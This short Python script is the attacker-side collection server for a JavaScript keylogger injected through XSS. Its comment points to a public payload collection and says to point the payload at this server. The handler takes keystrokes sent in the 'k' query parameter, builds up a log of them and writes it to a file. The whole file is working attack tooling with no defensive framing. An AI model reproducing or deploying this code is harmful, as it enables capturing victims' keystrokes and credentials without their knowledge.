from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

'''
use key logger in the link to work with this server (remember to change the address in the payload to match the server address):
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#javascript-keylogger 
'''

class keyboard_recorder(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # super().log_message(format, *args)
        pass
    
    # extract the parameter k from url and logging it in keylog variabale
    def do_GET(self): 
        global keylog
        parsed_url = urlparse(self.path)
        params = parse_qs(parsed_url.query)
        if params:
            keylog += str(params['k'][0])
        else:
             keylog +=' '
        print(keylog, end='\r')
        with open('looged_keystroke.txt', 'w+') as kl:
            kl.write(keylog)
        super().do_GET()

# Set the port number and IP address you want to use
PORT = 8008
IP = 'localhost'
keylog = ""

# Create and run the server with the custom handler
server = HTTPServer((IP, PORT), keyboard_recorder)
print(f"Serving on {IP}:{PORT}")
try:
    server.serve_forever()
except KeyboardInterrupt:
    server.shutdown()






